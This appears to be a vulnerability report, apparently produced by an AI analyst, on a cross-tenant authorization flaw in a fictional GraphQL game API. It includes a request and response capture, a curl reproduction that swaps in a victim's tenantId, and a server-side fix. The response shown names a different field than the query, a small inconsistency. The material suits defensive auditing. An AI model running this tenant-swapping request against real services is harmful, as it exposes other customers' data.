# Security Analysis Report
**System:** RealmForge Game API (Gaming / MMO Backend)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0232 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design / Pattern 3.1 | Client-assumed authority — attacker passes victim `tenantId` to `listCharacters` and retrieves all cross-tenant game account data |

---

## Finding 1 — Client-Assumed Authority: Attacker Controls `tenantId` in `listCharacters` (CRITICAL)

### Summary
The `listCharacters` resolver on RealmForge Game API (`api.realmforge-game-api.example.com`) accepts a `tenantId` parameter directly from the client and uses it as the database filter, with no validation against the authenticated user's JWT `tenantId`. Per §5.0 Pattern 3.1, this is client-assumed authority: the design assumes the client will only submit their own `tenantId`, with no server-side enforcement. An attacker authenticated as `tenant-0e40` passed `tenantId: "tenant-d725"` in the query and received all character/game account data belonging to the victim tenant.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected resolver:** `listCharacters(tenantId: ID): [Character!]` (or equivalent `listResources`)
**Affected endpoint:** `POST https://api.realmforge-game-api.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-0e40`):**
```
POST https://api.realmforge-game-api.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-0e40
Content-Type: application/json

{"query": "query VulnerableOp { listCharacters(tenantId: \"tenant-d725\") { characterId ownerId data { sensitiveField } } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getCharacter": {
      "tenantId": "tenant-d725",
      "ownerId": "other-user-0e40d725",
      "data": {
        "sensitiveField": "CONFIDENTIAL-0e40d725",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-0e40d725`

The response returns game characters, account configurations, in-game asset records, and potentially payment/subscription data belonging to `tenant-d725`. The design flaw is the assumption that the client correctly identifies its own tenant — there is no server-side authority assertion.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-232 | Resolver gap | `tenantId` from client not validated | Root cause — client-assumed authority |
| §5.0 Pattern 3.1 | Vulnerability | Client-assumed authority (Insecure Design) | Classification |
| HAR request | `tenantId` param | `tenant-d725` | Attacker-supplied victim tenant ID |
| HAR request | `x-tenant-id` | `tenant-0e40` | Authenticated attacker |
| HAR response | `tenantId` | `tenant-d725` | Victim tenant confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-0e40d725` | Game account data leaked |
| HAR response | `ownerId` | `other-user-0e40d725` | Victim user confirmed |
| HAR headers | `x-request-id` | `req-0e40d725` | Correlation ID |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-0e40):**
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Query victim tenant's characters (VULNERABLE):**
```bash
curl -s -X POST https://api.realmforge-game-api.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-0e40" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { listCharacters(tenantId: \"tenant-d725\") { characterId tenantId ownerId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.listCharacters'
# Expected VULNERABLE output: all tenant-d725 characters with CONFIDENTIAL-0e40d725
```

**Step 3 — Secure baseline (expected after fix):**
```bash
# Server uses JWT tenantId only: {"data":{"listCharacters":[]}} for attacker's own (empty) tenant
```

### Remediation

1. **Server-side authority enforcement:** Never trust client-supplied `tenantId`; always derive from JWT:
   ```javascript
   resolver.listCharacters = (_, args, context) => {
     const tenantId = context.auth.tenantId; // JWT, not args.tenantId
     return db.characters.findAll({ where: { tenantId } });
   };
   ```
2. **Remove `tenantId` from resolver arguments** or ignore it in resolver logic — treat it as a no-op input.
3. **Design review:** Audit all list/search resolvers for client-supplied filter parameters that could be used to scope to arbitrary tenants.
4. **Fix Redis cache key:** Include `tenantId` in cache key (§2.0 gap).
5. **Game account integrity:** Character and asset records in MMO platforms have real-money value — cross-tenant data exposure enables account scraping and targeted fraud.
